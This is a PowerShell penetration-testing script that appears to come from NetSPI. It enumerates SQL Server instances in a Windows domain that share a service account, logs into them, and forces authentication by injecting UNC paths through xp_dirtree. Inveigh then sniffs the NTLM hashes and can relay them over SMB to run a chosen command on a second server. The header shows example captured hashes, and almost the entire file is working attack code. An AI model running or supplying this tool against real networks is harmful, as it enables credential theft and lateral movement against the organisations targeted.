<#
# author: scott sutherland (@_nullbind), NetSPI 2016
# script name: Get-SQLSharedAccountPwHash.ps1
# requirements: import-module powerupsql.psm1 (https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/PowerUpSQL.psm1);import-module invoke-inveigh.ps1;import-module Inveigh-Relay.ps1 (https://github.com/Kevin-Robertson/Inveigh)
# Note: use for alt domain user: runas /noprofile /netonly /user:domain\users powershell.exe
# Example: .\Get-SQLSharedAccountPwHash.ps1 -username domain\user -password SuperPassword! -domaincontroller 10.0.0.1

Example:

.\Get-SQLSharedAccountPwHash.ps1 -username domain.test\user -password SuperPassword! -domaincontroller 10.0.0.1
Querying domain controller for mssql spn...
VERBOSE: Grabbing SQL Server SPNs from domain...
VERBOSE: Getting domain SPNs...
VERBOSE: 20 SPNs found on servers that matched search criteria.
VERBOSE: Parsing SQL Server instances from SPNs...
VERBOSE: 10 instances were found.
10 MSSQL SPNs found
Filtering out computer accounts...
6 MSSQL SPNs found using domain accounts
Selecting shared accounts...
3 shared SQL Server domain service accounts were found
SvcAnt1 : START
SvcAnt1 : 1 servers were found that use the SQL Server domain service account SvcAnt1
SvcAnt1 : attempting to connect to each one...
SvcAnt1 : SQL Servers using the SvcAnt1 service account could not be logged into.
SvcAnt1 : END
SvcAnt2 : START
SvcAnt2 : 4 servers were found that use the SQL Server domain service account SvcAnt2
SvcAnt2 : attempting to connect to each one...
SvcAnt2 : 2 sql servers could be logged into that use the sql server service account SvcAnt2
SvcAnt2 : SQLServer1.domain.test set to target1
SvcAnt2 : SQLServer2.domain.test set to target2
SvcAnt2 : Starting sniffer
SvcAnt2 : Injecting UNC path into SQLServer1.domain.test
SvcAnt2 : Checking for credentials captured during unc injection from SQLServer1.domain.test
SvcAnt2::DOMAIN.TEST:39BCDCDE03CDEBCF00000000000000000000000000000000:95FA8EF123EE8BD13C703739CF2072C22959A6BAA6D0B253:1C05072DD72DD8A0
SvcAnt2::DOMAIN.TEST:832CD84F60ACDFE000000000000000000000000000000000:5547CBDF82480EF1287911952E0F7B3AD84ABEBFC2E63230:DCFA9F06D8A2A80C
SvcAnt2::DOMAIN.TEST:6A95DBCDEDCDBC6300000000000000000000000000000000:00239A136085815049E2B5B6FBD95BE391A3A92EB447C999:495ECF315E872DD3
SvcAnt2::DOMAIN.TEST:BF99CDCFF48C3C1400000000000000000000000000000000:47FDDADA2364149614D44F5A44EEF12D0CC363D5AA15F6C5:BA04072DDFB2D91E
SvcAnt2::DOMAIN.TEST:C9D036CCDEF85ABE00000000000000000000000000000000:8BEAE1E0D83E7F66F318B7F15C83D329AD87041BF303B7FF:097C3695E72DDED5
SvcAnt2 : Stopping sniffer
SvcAnt2 : END
SvcAnt3 : START
SvcAnt3 : 1 servers were found that use the SQL Server domain service account SvcAnt3
SvcAnt3 : attempting to connect to each one...
SvcAnt3 : SQL Servers using the SvcAnt3 service account could not be logged into.
SvcAnt3 : END
#>

[CmdletBinding()]
Param(
  [Parameter(Mandatory=$false)]
   [string]$username,
	
   [Parameter(Mandatory=$false)]
   [string]$password,

   [Parameter(Mandatory=$false)]
   [string]$domaincontroller,

   [Parameter(Mandatory=$false)]
   [string]$relayip,

   [Parameter(Mandatory=$false)]
   [string]$relaycommand,

   [Parameter(Mandatory=$false)]
   [int]$timeout = 5
)

 
#-----------------
# discover shared accounts here
#-----------------

# Get SQL Server service account for domain computers that are not computer accounts
Write-output "Querying domain controller for mssql spn..."
$z = Get-SQLInstanceDomain -verbose -DomainController $domaincontroller -Username $username -Password $password
$zCount = $z.count
Write-output "$zCount MSSQL SPNs found"

# Filter out the computer accounts
Write-output "Filtering out computer accounts..."
$x = $z | Where-Object { $_.DomainAccount -notlike "*$"} | select computername,instance,domainaccount,lastlogon 
$xCount = $x.Count
Write-output "$xCount MSSQL SPNs found using domain accounts"

#-----------------
# Identify targets here
#-----------------

# check for sql server instances that use domain service accounts
if(-not $x){
    
    Write-output "0 shared SQL Server domain service accounts found."

}else{
        
    Write-output "Selecting shared accounts..."

    # Select accounts that are shared
    $y = $x | group domainaccount -NoElement | Where-Object {$_.count -ge 2}    
    $sharecount = $y | select name -Unique | measure | select count -ExpandProperty count
    Write-output "$sharecount shared SQL Server domain service accounts were found"

    # iterate through each shared account
    $y | %{

        # set shared account name
        $sharedaccount = $_.name
        
        Write-output "$sharedaccount : START"
    
        # get instances that match the current shared account
        $instances = $x | select computername,instance,domainaccount,lastlogon | ? {$_.domainaccount -eq $sharedaccount}

        # get number of unique computers that use the account
        $instancesUniqueComputer = $instances | select computername -Unique | measure | select count -ExpandProperty count
        Write-output "$sharedaccount : $instancesUniqueComputer servers were found that use the SQL Server domain service account $sharedaccount"
      
        # attempt to connect to each
        Write-output "$sharedaccount : attempting to connect to each one..."
        $AccessibleInstances = $instances | Get-SQLConnectionTest | ? {$_.status -eq "Accessible"}

        # count how many were accessible
        $AccessibleInstancesUniqueServers = $AccessibleInstances | select computername -Unique| measure | select count -ExpandProperty count
        if($AccessibleInstancesUniqueServers -ge 2){

            write-output "$sharedaccount : $AccessibleInstancesUniqueServers sql servers could be logged into that use the sql server service account $sharedaccount"

            # set target 1
            $target1 = $AccessibleInstances | select instance -First 1 -ExpandProperty instance
            $target1Computer = Get-ComputerNameFromInstance -Instance $target1
            write-output "$sharedaccount : $target1 set to target1" 

            # set target 2
            $target2 = $AccessibleInstances | ? {$_.computername -ne "$target1Computer"} | select instance -First 1 -ExpandProperty instance
            $target2ip = Resolve-DnsName $target2 | select IPaddress -ExpandProperty ipaddress
            write-output "$sharedaccount : $target2 set to target2" 

            #-----------------
            # attack here
            #-----------------
            # - import inveigh
            # sniff and set relay target to target2
            Write-Output "$sharedaccount : Starting sniffer"
            if($relayip){
                
                # need to check for command here
                Invoke-Inveigh -SMBRelay Y -SMBRelayTarget $target2ip -SMBRelayCommand "$relaycommand" -SpooferHostsReply $target1 -NBNS Y | Out-Null 
            }else{
                Invoke-Inveigh -SpooferHostsReply $target1 -NBNS Y | Out-Null 
            }

            # unc path injection for each ip
            Write-Output "$sharedaccount : Injecting UNC path into $target1"
            Get-NetIPAddress | select ipaddress | %{         
                $IP = $_.IPAddress
                # unc path inject into target1
                Get-SQLQuery -Instance $target2 -Query "xp_dirtree '\\$IP\path'" 
            }

            # wait 5 seconds
            sleep $timeout

            # check for win
            Write-Output "$sharedaccount : Checking for credentials captured during unc injection from $target1"
            Get-InveighCleartext 
            Get-InveighNTLMv1
            Get-InveighNTLMv2

            # on file goto next            
            Stop-Inveigh | Out-Null
            Clear-Inveigh | Out-Null
            Write-Output "$sharedaccount : Stopping sniffer"
        
        }else{

            # test connection
            Write-output "$sharedaccount : SQL Servers using the $sharedaccount service account could not be logged into."
        }
        Write-output "$sharedaccount : END"
    }
}

